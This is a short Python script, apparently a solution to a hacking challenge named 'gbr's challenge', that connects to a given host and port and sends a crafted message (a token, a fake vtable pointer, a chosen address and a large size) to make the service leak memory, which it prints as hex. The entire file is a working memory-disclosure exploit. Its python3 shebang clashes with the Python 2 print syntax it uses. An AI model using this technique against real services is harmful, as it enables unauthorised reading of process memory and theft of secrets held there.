#!/usr/bin/env python3

# Memory reader for gbr's challenge
# Written by Maycon Maia Vitali ( maycon at hacknroll dot com )
# Hack N' Roll

import sys, socket, struct
from binascii import hexlify

pack = lambda x : struct.pack('I', x)
unpack = lambda x : struct.unpack('<L', x)[0]

if len(sys.argv) != 4 :
    print "Use: %s <host> <port> <address>" % (sys.argv[0])
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])
addr = int(sys.argv[3], 16)

s0ck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s0ck.connect((host, port))

s0ck.send(
        "jigcsaw1:"      + # Token
        pack(0x41414141) + # &vtable
        pack(addr)       + # Input.ptr
        pack(0x1b0000)     # Input.size
    )

recv = s0ck.recv(1024)
print hexlify(recv)

s0ck.close()
